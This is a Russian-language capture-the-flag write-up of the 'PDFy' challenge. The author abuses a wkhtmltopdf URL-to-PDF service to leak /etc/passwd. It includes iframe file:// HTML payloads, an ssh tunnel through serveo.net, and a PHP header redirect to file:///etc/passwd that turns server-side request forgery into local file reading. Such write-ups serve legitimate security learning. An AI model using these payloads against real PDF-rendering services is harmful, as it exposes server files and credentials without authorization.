# PDFy
ACHTUNG! много воды, мой первый райтап, на эмоциях

![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/c32887e3-3e3a-43d4-9046-dabc22135352)
Суть задачи в том, что нам дают возможность в форме ввода написать адрес сайта, который мы хотим превратить в .pdf файл.
Как говорит описание задачи нужно добиться утечки /etc/passwd.

![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/4a7c2d00-6ca9-427e-956e-c52083733196)
Войдя на страничку, видим форму ввода и предложение закинуть адрес любимого сайтика, чтобы увидеть его в pdf формате


Ввел https://google.com, получил свой pdf файл
![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/c16c4060-f834-4f12-8bea-94091820a66b)

Можно заметить, что страница выглядит не совсем привычно, будто бы отсутствуют стили, разметка где-то съезжает, если ввести другие страницы.

Если ввести пустоту, то выдаст ошибку 
```
{
    "level": "danger",
    "message": "Malformed url "
}
```
Если ввести проблемную ссылку, то выйдет ошибка
```
{
    "level": "error",
    "message": "There was an error: Error generating PDF: Command '['wkhtmltopdf', '--margin-top', '0', '--margin-right', '0', '--margin-bottom', '0', '--margin-left', '0', \"'https://45918e26a690bfbd996ba63814a8f24b.serveo.net/phppy.php?x=/etc/passwd'\", 'application/static/pdfs/b976b682d3a031d314791f89cf69.pdf']' returned non-zero exit status 1."
}
```
Можно обнаружить, что используется некий *'wkhtmltopdf'*.

Погуглив, можно узнать, что это тулза для генерации pdf файлов в веб проекте
![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/29709514-a5bc-4f7b-b387-b7210585b60f)


Погуглив 'wkhtmltopdf lfi' находим [уязвимости](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/) связанные с этим сервисом.

Предлагают следующий способ 
```
POST /api/v1/pdf_report HTTP/1.1
[..]
{“data”:”<div><p>Report Heading</p>[..]}


POST /api/v1/pdf_report HTTP/1.1
[..]
{“data”:”<div><p>Report Heading</p><iframe src=”file:///etc/passwd” height=”500” width=”500”>[..]}
```
интересная затея через html выводить содержимое file:///etc/passwd
<!-- P.S. я около двух дней еб#лся с этой задачей, а решение оказывается скрывается в одной строчке php-кода, считаю, что стоит показать все мои попытки решить задачу, в конце будет уже окончательное решение-->
попробуем реализовать это через webhook.site (очевидно, что сервис PDFy не сможет видеть localhost, поэтому придется прибегнуть к услугам сервисом туннелирования или даже поднять сервер и захостить)

![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/10b41c2a-292c-44f9-bcb7-f3c307e5a0c1)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <h></h>
    <iframe src="file:///etc/passwd"></iframe>
<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>
</head>
<body>
</body>
</html>
```

![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/302a8985-d05e-4038-bd0f-5e438e596778)
Наш вебхук теперь выглядит так, вместо пустоты должно выводиться содержимое /etc/passwd, у нас этого не видно, но в теории у Linux сервера, должно сработать и выведется список юзеров и пароли
...
Получаем свою ошибку
```
"message": "There was an error: Error generating PDF: Command '['wkhtmltopdf', '--margin-top', '0', '--margin-right', '0', '--margin-bottom', '0', '--margin-left', '0', 'https://webhook.site/54c5bd57-1beb-4a5a-a0fd-0c45b34768e9', 'application/static/pdfs/ccf716f26454114afcc36527723b.pdf']' returned non-zero exit status 1."
```

если убрать в Content type: text/html и поставить к примеру просто text/plain, то он это будет читать, ведь ему не придется рендерить html контент и js script

### ПОНЯТНО! вебхук нам в этом никак не поможет, придётся шаманить по своему

Воспользуемся сервисами туннелирования, СПОЙЛЕР ngrok нам не поможет, т.к как оказалось у них сменилась политика и теперь при переходе на страницу, нужно сперва подтвердить переход, а лишь потом получать уже содержимое страницы, это нам не подходит, т.к. сервис тупо будет возвращать нам пустую страницу(я на это и потратил день)
Воспользуемся бесплатным и не требующим установки сервисом serveo.net
Чтобы запустить в cmd вводим 
```
ssh -R 80:localhost:8000 serveo.net
```
после этого Сервео выдаст нам временную ссылку на сайт с нашим локалхостом, нужно её вставить в форму ввода и забрать флаг, но перед этим надо поднять этот самый локалхост на 8000 порту.

СПОЙЛЕР python fast api не лучший выбор, как оказалось есть еще одна [уязвимость](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/) с php кодом
```
<?php header('location:file://'.$_REQUEST['x']); ?>
```
Поднимаем сервер на php
```
php -S localhost:8000
```
чтобы сработало, нужно в форму ввода отправить https://abc.serveo.net/<phpfilename>.php?x=/etc/passwd
...
опять не сработало, на этот раз браузер просто не дает нам это сделать![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/856d0b42-53dd-42df-a10f-86f9e82b998f)
выходит ошибка безопасности... сервис возвращает ошибку или пустую страницу, придется искать другой способ.

Я попытался сразу же видоизменить код и чтобы он сразу в заголовок вставлял Location:file:///etc/passwd
```
<?php
header("location: file:///etc/passwd");
// phpinfo();
?>
```
Финальный код, который срабатывает на сервере, НО НЕ У НАС, поэтому надо сразу заливать в сервис PDFy, у нас будет выходить та же ошибка.

![image](https://github.com/Seven11Eleven/CTF-writeups/assets/120821293/22e743de-1158-42be-9896-2319f1d6d62b)
у нас получилось, мы получили флаг и теперь можем сабмитнуть его
